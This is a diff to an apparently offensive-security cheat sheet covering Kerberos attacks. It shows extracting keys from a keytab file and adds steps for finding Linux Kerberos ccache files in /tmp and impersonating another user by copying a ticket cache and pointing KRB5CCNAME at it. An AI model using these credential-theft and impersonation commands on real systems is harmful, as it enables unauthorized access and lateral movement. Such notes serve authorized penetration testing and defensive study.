@@ -788,11 +788,20 @@ https://github.com/sosdave/KeyTabExtract
 $ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 ```
 
-- Find Kerberos Ccache Files
+- Find Linux Ccache Files
 
 ```
 # Check KRB5CCNAME environment variable
 $ env | grep -i krb5
+$ ls -la /tmp
+```
+
+- Impersonate a User With Linux Ccache File
+
+```
+# cp /tmp/krb5cc_647401106_I8I133 .
+# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+# klist
 ```
 
 #5. - Privilege Escalation
